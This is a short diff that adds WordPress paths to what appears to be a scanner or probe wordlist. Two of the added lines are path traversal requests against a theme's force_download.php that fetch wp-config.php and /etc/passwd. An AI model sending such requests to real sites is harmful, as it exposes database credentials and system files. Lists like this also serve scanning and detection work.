@@ -232,3 +232,6 @@
 /
 /wp-json/learnpress/v1/users
 /wp-content/plugins/1-click-migration/ocm_debug.log
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
